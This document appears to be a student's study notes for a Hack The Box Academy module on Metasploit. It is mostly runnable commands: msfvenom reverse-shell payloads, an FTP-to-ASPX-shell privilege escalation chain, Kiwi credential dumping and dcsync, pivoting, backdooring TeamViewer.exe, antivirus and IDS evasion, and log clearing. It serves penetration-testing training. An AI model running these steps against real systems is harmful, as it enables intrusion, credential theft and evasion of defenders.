# HTB Academy — Module 09: Using the Metasploit Framework

| Field | Details |
|---|---|
| **Platform** | Hack The Box Academy |
| **Module** | 09 — Using the Metasploit Framework |
| **Difficulty** | Medium |
| **Type** | Offensive — Exploitation, Post-Exploitation, Evasion |
| **Date** | April 2026 |

---

## Module Overview

This module covers the Metasploit Framework end-to-end — from architecture and database setup through exploitation, post-exploitation, pivoting, custom module development, payload generation, and AV/IDS evasion. Every section maps directly to CPTS exam technique requirements.

**Tools covered:** `msfconsole`, `msfvenom`, `db_nmap`, `Meterpreter`, `Kiwi`, `searchsploit`

**Core areas:**

| Area | Description |
|---|---|
| MSFConsole | Interface, search, module configuration, sessions |
| Database | PostgreSQL setup, workspace management, scan import |
| Payloads | Staged vs stageless, platform selection |
| Meterpreter | Commands, process migration, file ops, pivoting |
| Encoders | Bad character removal, basic obfuscation |
| Exploitation flow | Recon → exploit → post → privesc → credential harvest |
| Custom modules | Importing from ExploitDB, module anatomy |
| MSFVenom | Payload generation for every platform and format |
| Evasion | File-level and network-level bypass techniques |
| MSF6 changes | AES encryption, polymorphic shellcode, Kiwi |

---

## Section 1 — Metasploit Architecture

Metasploit Framework is an open-source penetration testing platform maintained by Rapid7. It provides a unified interface for exploit development, payload delivery, post-exploitation, and reporting.

### Module Types

| Type | Purpose |
|---|---|
| exploit | Attack code targeting a specific vulnerability |
| auxiliary | Scanners, fuzzers, brute-forcers — no payload delivered |
| post | Post-exploitation actions on an active session |
| payload | Shellcode delivered after a successful exploit |
| encoder | Transforms payload bytes — bad char removal, basic obfuscation |
| nop | NOP sled generators for buffer overflow exploits |
| evasion | Generates AV-evasive payloads |

### Directory Structure

```bash
/usr/share/metasploit-framework/
├── modules/         ← all module types
├── plugins/         ← loadable plugins (nessus, nexpose)
├── scripts/         ← Meterpreter and resource scripts
└── data/wordlists/  ← password lists used by modules
~/.msf4/             ← user-local module overrides
```

---

## Section 2 — MSFConsole Core Commands

`msfconsole` is the primary interface. All operations — search, configure, execute, and manage sessions — happen here.

```bash
Hackerpatel007_1@htb[/htb]$ msfconsole -q                          # Launch without banner

msf6 > search type:exploit platform:windows smb                   # Filter search
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > info                                                       # Full module detail
msf6 > show options                                               # Configurable parameters
msf6 > set RHOSTS 10.10.10.5
msf6 > set LHOST tun0                                             # Always tun0 on HTB
msf6 > check                                                      # Verify target is vulnerable
msf6 > run                                                        # Launch module

msf6 > sessions -l                                                # List active sessions
msf6 > sessions -i 1                                              # Interact with session 1
msf6 > background                                                 # Ctrl+Z — send to background
msf6 > jobs -l                                                    # List background jobs
```

### Key Options in Almost Every Module

| Option | Meaning |
|---|---|
| RHOSTS | Target IP, range, or CIDR |
| LHOST | Attacker IP — always use tun0 on HTB |
| RPORT | Target service port |
| LPORT | Attacker listening port |
| PAYLOAD | Shellcode to deliver post-exploit |

### Module Ranks

| Rank | Meaning |
|---|---|
| excellent | Never crashes service, highly reliable |
| great | Very reliable, minor caveats |
| good | Generally reliable |
| normal | Default — may have stability issues |
| average | Works in some environments |
| low | Rarely works |
| manual | Requires significant manual steps |

---

## Section 3 — MSF Database (PostgreSQL)

The MSF database stores all scan results, hosts, services, vulnerabilities, credentials, and loot across an engagement. Essential for tracking multi-host progress.

```bash
Hackerpatel007_1@htb[/htb]$ msfdb init              # First-time database setup
Hackerpatel007_1@htb[/htb]$ msfdb start             # Start PostgreSQL service

msf6 > db_status                                    # Verify connection

# Workspaces — isolate each engagement
msf6 > workspace -a client_name
msf6 > workspace client_name

# Scan directly into database
msf6 > db_nmap -sV -sC -T4 -p- 10.10.10.5

# Query stored results
msf6 > hosts                                        # All discovered hosts
msf6 > services                                     # All services and versions
msf6 > vulns                                        # Confirmed vulnerabilities
msf6 > creds                                        # Harvested credentials
msf6 > loot                                         # Files pulled from targets

# Import external scan results
msf6 > db_import nmap_results.xml
```

---

## Section 4 — Payloads

Payloads are the shellcode executed on the target after exploitation succeeds.

### Staged vs Stageless — The Naming Rule

```text
windows/x64/meterpreter/reverse_tcp    ← STAGED    (/ before reverse_tcp)
windows/x64/meterpreter_reverse_tcp    ← STAGELESS (_ before reverse_tcp)
```

- **Staged:** A tiny stager (~200 bytes) connects back first, then Metasploit sends the full Meterpreter DLL over that connection. Requires `multi/handler`. Best for buffer overflow exploits with tight space constraints.
- **Stageless:** Complete payload in one binary — no second connection required. Can be caught by a raw `nc` listener. Best for social engineering, USB drops, and direct delivery.

### Common Payloads by Target

| Target | Payload |
|---|---|
| Windows 64-bit | windows/x64/meterpreter/reverse_tcp |
| Windows 32-bit | windows/meterpreter/reverse_tcp |
| Linux 64-bit | linux/x64/meterpreter/reverse_tcp |
| PHP web app | php/meterpreter/reverse_tcp |
| JSP/Tomcat | java/jsp_shell_reverse_tcp |
| Android | android/meterpreter/reverse_tcp |

### Reverse vs Bind

- **Reverse** — Target calls back to attacker. Works through NAT and outbound-only firewalls.
- **Bind** — Attacker connects to target. Requires an open inbound port on the target.

---

## Section 5 — Meterpreter

Meterpreter is an advanced in-memory payload that runs entirely in RAM — nothing written to disk. It communicates over an encrypted channel and supports dynamic extension loading at runtime.

```text
# System information
meterpreter > getuid            # Current user
meterpreter > getsystem         # Auto-attempt SYSTEM privilege escalation
meterpreter > sysinfo           # OS, hostname, architecture, language
meterpreter > getpid            # Current process ID

# File operations
meterpreter > ls
meterpreter > pwd
meterpreter > cd C:\Users\Administrator
meterpreter > upload /local/file C:\remote\path
meterpreter > download C:\remote\file /local/path
meterpreter > cat C:\Windows\System32\drivers\etc\hosts

# Process management
meterpreter > ps                           # List all running processes
meterpreter > migrate 1234                 # Move Meterpreter to PID 1234
meterpreter > shell                        # Drop to native OS shell

# Network
meterpreter > ifconfig
meterpreter > arp
meterpreter > netstat
meterpreter > portfwd add -l 4445 -p 3389 -r 172.16.0.5    # Port forward RDP

# Post-exploitation
meterpreter > hashdump                     # Dump SAM hashes (requires SYSTEM)
meterpreter > run post/[module]            # Run any post module from session
meterpreter > background                   # Background session (Ctrl+Z)
```

### Process Migration — Do This Immediately

Web server processes (IIS, `w3wp.exe`, `tomcat`) frequently die or restart, killing your session. Migrate to a stable process immediately after getting a shell:

```text
meterpreter > ps                           # Find stable process (explorer.exe, svchost.exe)
meterpreter > migrate 2868                 # Migrate to that PID
```

---

## Section 6 — Standard Exploitation Workflow

```text
1.  db_nmap -sV -T4 -p- [target]           → discover services + store in DB
2.  search [service/CVE]                   → find relevant modules
3.  use [module]                           → load
4.  check                                  → verify target is vulnerable (if available)
5.  set RHOSTS, LHOST, LPORT               → configure
6.  run                                    → exploit
7.  migrate [stable_pid]                   → move to stable process immediately
8.  background                             → continue enumeration
9.  local_exploit_suggester                → find privilege escalation path
10. privesc module → SYSTEM                → full access
11. kiwi / hashdump                        → credential harvest
```

---

## Section 7 — Post-Exploitation: Full Attack Chain Example

**Scenario:** FTP anonymous upload → IIS ASPX shell → Meterpreter → `local_exploit_suggester` → SYSTEM

**Key insight:** `aspnet_client` folder visible in FTP listing = ASP.NET runtime active = uploaded ASPX files will execute.

```bash
# Generate ASPX payload
Hackerpatel007_1@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp \
LHOST=tun0 LPORT=1337 -f aspx -o shell.aspx

# Upload via FTP
Hackerpatel007_1@htb[/htb]$ ftp 10.10.10.5
ftp> put shell.aspx

# Start handler
msf6 > use multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set LHOST tun0
msf6 > set LPORT 1337
msf6 > run

# Browse to http://[target]/shell.aspx → session opens

# Find privilege escalation paths
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set SESSION 1
msf6 > run

# Escalate (example — x86 Windows kernel exploit)
msf6 > use exploit/windows/local/ms10_015_kitrap0d
msf6 > set SESSION 1
msf6 > run

meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM
```

---

## Section 8 — Encoders and NOPs

### Encoders

Encoders transform shellcode bytes — primarily used for bad character removal in buffer overflow exploits and basic obfuscation.

```bash
Hackerpatel007_1@htb[/htb]$ msfvenom -p [payload] -e x86/shikata_ga_nai -i 5 -f exe -o shell.exe
# -e: encoder name
# -i: number of encoding iterations
```

Important: In 2026, encoding alone does **not** bypass modern AV. Heuristic engines recognise the `shikata_ga_nai` decoder stub regardless of iteration count. Encoding is primarily useful for bad character removal in BOF exploits, not AV evasion.

### Common Bad Characters to Remove

| Byte | Name | Reason |
|---|---|---|
| `\x00` | Null byte | Terminates strings — most exploits break |
| `\x0a` | Newline | Breaks input parsing on line-based protocols |
| `\x0d` | Carriage return | Breaks input parsing on HTTP and other protocols |

### NOP Sleds

NOP (`\x90`) instructions pad memory before shellcode in buffer overflow exploits. Replace with functional NOP equivalents to evade NOP-pattern detection:

```text
\x41\x40  → INC EAX; DEC EAX (net-zero effect)
\x21\xC0  → AND EAX, EAX     (net-zero effect)
```

---

## Section 9 — Plugins and Mixins

### Plugins

Plugins extend `msfconsole` with external tool integration:

```text
msf6 > load nessus          # Nessus vulnerability scanner integration
msf6 > load nexpose         # Nexpose scanner integration
msf6 > load msgrpc          # Remote API access
```

### Mixins

Mixins are Ruby modules included in MSF module code to add capabilities:

| Mixin | What It Adds |
|---|---|
| Msf::Exploit::Remote::HttpClient | `send_request_cgi()`, HTTP handling methods |
| Msf::Exploit::PhpEXE | PHP payload generation |
| Msf::Exploit::FileDropper | Auto-cleanup of dropped files after exploit |
| Msf::Auxiliary::Report | `report_host()`, `report_vuln()`, database logging |
| Msf::Auxiliary::Scanner | Multi-host scanning via `run_host()` |

---

## Section 10 — Pivoting with Meterpreter

After compromising a host that is dual-homed (connected to multiple network segments), route traffic through it to reach otherwise inaccessible internal hosts.

```text
# Add route through compromised host into internal subnet
meterpreter > run post/multi/manage/autoroute SUBNET=172.16.0.0 NETMASK=255.255.0.0

# Set up SOCKS proxy for proxychains
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > set VERSION 5
msf6 > run -j
```

**Use external tools through the pivot:**

```bash
Hackerpatel007_1@htb[/htb]$ proxychains nmap -sT -Pn 172.16.0.5
Hackerpatel007_1@htb[/htb]$ proxychains curl http://172.16.0.5
```

**Targets** define environment-specific parameters (return addresses, offsets for BOF exploits):

```ruby
'Targets' => [
  [ 'Windows 7 SP1 x64',  { 'Ret' => 0x7ffdf000, 'Offset' => 1052 } ],
  [ 'Windows 10 x64',     { 'Ret' => 0x7ff8b000, 'Offset' => 1060 } ],
]
```

---

## Section 11 — Importing Custom Modules from ExploitDB

```bash
# Search for MSF-compatible modules (Ruby .rb files)
Hackerpatel007_1@htb[/htb]$ searchsploit -t nagios3 --include=".rb"

# Copy to working directory
Hackerpatel007_1@htb[/htb]$ searchsploit -m unix/webapps/9861.rb

# Rename to snake_case (hard requirement)
Hackerpatel007_1@htb[/htb]$ mv 9861.rb nagios3_command_injection.rb

# Copy into MSF module path
Hackerpatel007_1@htb[/htb]$ sudo cp nagios3_command_injection.rb \
/usr/share/metasploit-framework/modules/exploits/unix/webapp/

# Reload modules inside msfconsole
msf6 > reload_all
msf6 > use exploit/unix/webapp/nagios3_command_injection
```

### Naming Rules — Violations Cause Silent Load Failures

- `snake_case` only — no dashes or spaces
- Alphanumeric + underscores only
- Must end in `.rb`
- Hard tabs required in Ruby code (not spaces)
- First non-comment line must be: `class MetasploitModule < Msf::Exploit::Remote`

### Module Anatomy

```ruby
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Module Name',
      'Description'    => %q{ One-line description },
      'Author'         => ['username'],
      'References'     => [['CVE', '2024-12345'], ['URL', 'https://...']],
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Targets'        => [['Target Name', {}]],
      'DisclosureDate' => '2024-01-01',
      'DefaultTarget'  => 0
    ))
    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/']),
      OptPath.new('PASSWORDS',   [true, 'Wordlist',
        File.join(Msf::Config.data_directory, 'wordlists', 'passwords.txt')])
    ])
  end

  def exploit
    # Attack logic here
  end
end
```

---

## Section 12 — MSFVenom Reference

MSFVenom replaced the separate `msfpayload` and `msfencode` tools (retired June 2015), combining both into a single payload generation utility.

```bash
# Core syntax
Hackerpatel007_1@htb[/htb]$ msfvenom -p [payload] LHOST=[tun0 IP] LPORT=[port] -f [format] -o [file]

# Windows EXE — staged
Hackerpatel007_1@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f exe -o shell.exe

# Windows EXE — stageless
Hackerpatel007_1@htb[/htb]$ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=tun0 LPORT=443 -f exe -o shell.exe

# Windows HTTPS (bypasses DPI — blends with HTTPS traffic)
Hackerpatel007_1@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f exe -o shell.exe

# Linux ELF
Hackerpatel007_1@htb[/htb]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f elf -o shell.elf

# ASPX web shell (IIS)
Hackerpatel007_1@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f aspx -o shell.aspx

# WAR file (Tomcat)
Hackerpatel007_1@htb[/htb]$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=443 -f war -o shell.war

# PHP web shell
Hackerpatel007_1@htb[/htb]$ msfvenom -p php/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f raw -o shell.php

# MSI installer (AlwaysInstallElevated privesc)
Hackerpatel007_1@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f msi -o shell.msi

# Raw C shellcode (BOF exploits)
Hackerpatel007_1@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f c

# Remove bad characters
Hackerpatel007_1@htb[/htb]$ msfvenom -p ... -b '\x00\x0a\x0d' -f exe -o shell.exe

# Template injection — best file-level evasion
Hackerpatel007_1@htb[/htb]$ msfvenom -p ... -x TeamViewer.exe -k -f exe -o TV_backdoor.exe

# Make ELF executable
Hackerpatel007_1@htb[/htb]$ chmod +x shell.elf

# List options
Hackerpatel007_1@htb[/htb]$ msfvenom --list payloads
Hackerpatel007_1@htb[/htb]$ msfvenom --list formats
Hackerpatel007_1@htb[/htb]$ msfvenom --list encoders
```

**Handler must exactly match the msfvenom payload:**

```text
msf6 > use multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_tcp   # Exact match to -p flag
msf6 > set LHOST tun0
msf6 > set LPORT 443
msf6 > set ExitOnSession false
msf6 > exploit -j                                        # Run as background job
```

---

## Section 13 — Firewall and IDS/IPS Evasion

### Two Protection Layers

| Layer | Examples | What It Inspects |
|---|---|---|
| Endpoint | AV, EDR, AMSI, HIPS | Files, processes, memory, API calls |
| Perimeter | NGFW, IDS, IPS, WAF | Network packets, traffic flows, protocols |

### Detection Methods and Bypasses

| Method | How It Works | Bypass Approach |
|---|---|---|
| Signature-based | Hash/byte match against known malware DB | Change bytes — encode, template, recompile |
| Heuristic | Behaviour analysis in sandbox before execution | Anti-sandbox logic, sleep/jitter before payload |
| Stateful protocol | Checks protocol compliance against RFC | Proper HTTP headers, realistic timing patterns |
| SOC live monitoring | Human analysts watching SIEM alerts | Low-and-slow timing, clean artifacts |

### File-Level Evasion Techniques

```bash
# Template injection — most effective approach
Hackerpatel007_1@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp \
LHOST=tun0 LPORT=443 -x TeamViewer.exe -k -f exe -o TV_backdoor.exe

# Double archive with password (reduces AV detection significantly)
Hackerpatel007_1@htb[/htb]$ msfvenom -p ... -o payload.js
Hackerpatel007_1@htb[/htb]$ rar a payload.rar -p payload.js && mv payload.rar payload
Hackerpatel007_1@htb[/htb]$ rar a final.rar -p payload     && mv final.rar final

# UPX packer (basic — commercial packers like Themida are more effective)
Hackerpatel007_1@htb[/htb]$ upx --best payload.exe
```

### Network-Level Evasion

```bash
# HTTPS payload — blends with legitimate web traffic
Hackerpatel007_1@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f exe -o shell.exe

# Nmap scan evasion
Hackerpatel007_1@htb[/htb]$ nmap -f --source-port 53 -D RND:5 -T1 [target]
# -f               = packet fragmentation
# --source-port 53 = spoof DNS source port (allowed everywhere)
# -D RND:5         = 5 random decoy IPs in scan traffic
# -T1              = slow timing (evades rate-based IDS detection)
```

### OPSEC Rules

- Never upload real engagement payloads to VirusTotal
- Always remove web shells after use (`rm` + `clearev`)
- Use `LPORT 443` not `4444` (443 doesn't trigger firewall alerts)
- Migrate from web process immediately after session opens

---

## Section 14 — MSF6 Key Changes (August 2020)

MSF6 introduced breaking compatibility with MSF5 — payloads and sessions are not interchangeable between versions.

### Major Changes

| Change | Technical Detail |
|---|---|
| AES E2E encryption | All 5 Meterpreter types use AES — network IDS cannot read C2 traffic |
| Polymorphic shellcode | Different bytes each `msfvenom` run — no stable static signature to match |
| Ordinal resolution | DLL exports by number not name — ReflectiveLoader string removed from payload |
| Integer commands | Meterpreter commands encoded as integers — no readable strings in payload bytes |
| SMBv3 support | Modern encrypted lateral movement — works where SMBv1/v2 disabled |
| Kiwi replaces Mimikatz | `load kiwi` — more stable, native Meterpreter integration |

### Five Meterpreter Implementations

| Implementation | Use Case |
|---|---|
| Windows | Standard Windows exploitation |
| Python | Any host with Python installed |
| Java | Tomcat, JBoss, Java application servers |
| Mettle | IoT, embedded Linux, unusual architectures |
| PHP | PHP web app file upload exploitation |

### Kiwi Post-Exploitation Commands

```text
meterpreter > load kiwi
meterpreter > creds_all           # Dump all credential types at once
meterpreter > lsa_dump_sam        # Local SAM hashes
meterpreter > lsa_dump_secrets    # LSA secrets (service account passwords)
meterpreter > dcsync              # DCSync attack — requires Domain Controller access
```

---

## Full Engagement Workflow

```bash
# 1 — Setup
Hackerpatel007_1@htb[/htb]$ msfdb start && msfconsole -q
msf6 > workspace -a target_name
msf6 > setg LHOST tun0

# 2 — Recon
msf6 > db_nmap -sV -sC -T4 -p- [target]
msf6 > services
msf6 > hosts

# 3 — Exploit
msf6 > search [service/CVE]
msf6 > use [module]
msf6 > check
msf6 > set options
msf6 > run

# 4 — Post-exploitation
meterpreter > migrate [stable_pid]        # Move to explorer.exe or svchost.exe
meterpreter > background

# 5 — Privilege escalation
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set SESSION 1
msf6 > run
msf6 > use exploit/windows/local/[suggested_module]
msf6 > set SESSION 1
msf6 > run
meterpreter > getuid                      # Confirm: NT AUTHORITY\SYSTEM

# 6 — Credential harvest
meterpreter > load kiwi
meterpreter > creds_all
meterpreter > lsa_dump_secrets

# 7 — Pivot to internal network
meterpreter > run post/multi/manage/autoroute SUBNET=[internal_subnet]
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > run -j
Hackerpatel007_1@htb[/htb]$ proxychains nmap -sT -Pn [internal_target]

# 8 — Cleanup
meterpreter > clearev
meterpreter > rm [uploaded_shells]
```

---

## Key Modules Reference

```text
post/multi/recon/local_exploit_suggester    # Find local privilege escalation paths
post/windows/gather/hashdump                # Dump SAM database hashes
post/windows/gather/enum_shares             # Enumerate network shares
post/windows/gather/enum_applications       # List installed software
post/multi/manage/autoroute                 # Add pivot routing through session
auxiliary/server/socks_proxy                # SOCKS5 proxy for proxychains
exploit/windows/local/ms10_015_kitrap0d     # Kernel privesc (x86 Windows)
exploit/windows/local/bypassuac_eventvwr    # UAC bypass
```

---

## Key Takeaways

The `check` command before running any exploit is a habit worth building from the start — on production systems in real engagements it prevents service crashes, and on exam machines it confirms the vulnerability before spending time configuring a full attack. Not all modules implement it, but when it is available it should always run first.

The staged vs stageless distinction causes more silent failures than any other single confusion in Metasploit. A staged payload caught by a raw `nc` listener simply drops the connection — there is no error message, the exploit appears to succeed but nothing arrives. The handler must match the payload exactly. The `/` vs `_` separator in the payload name is the entire rule — internalising that one character difference eliminates a common frustrating failure mode.

Process migration immediately after getting a Meterpreter shell is non-negotiable on web exploitation chains. IIS, Apache, Tomcat, and PHP-FPM processes restart on timeouts, new requests, or scheduled task triggers. A session that was alive five minutes ago is dead when you come back to it. `explorer.exe` and `svchost.exe` are the stable migration targets — they run for the entire uptime of the machine.

The `local_exploit_suggester` module is the most efficient privesc starting point on any Windows Meterpreter session. Running it immediately after migrating to a stable process takes under a minute and returns a ranked list of applicable local exploits. Cross-referencing those results with the Windows version from `sysinfo` then gives a direct path to SYSTEM without manual enumeration.

---

## Tools Reference

| Tool | Purpose | Location |
|---|---|---|
| msfconsole | Primary MSF interface | Built into Kali |
| msfvenom | Payload generation | Built into Kali |
| msfdb | Database management | Built into Kali |
| db_nmap | Nmap + automatic DB import | Inside msfconsole |
| Kiwi | Credential harvesting (Mimikatz replacement) | `load kiwi` inside Meterpreter |
| searchsploit | Offline ExploitDB search | Built into Kali |
| proxychains | Route tools through SOCKS pivot | Built into Kali |

## Resources

| Resource | URL |
|---|---|
| Metasploit Documentation | docs.metasploit.com |
| ExploitDB MSF Modules | exploit-db.com/?tag=3 |
| Metasploit Unleashed | offsec.com/metasploit-unleashed |
| GTFOBins (post-exploit) | gtfobins.github.io |
| PayloadsAllTheThings | github.com/swisskyrepo/PayloadsAllTheThings |
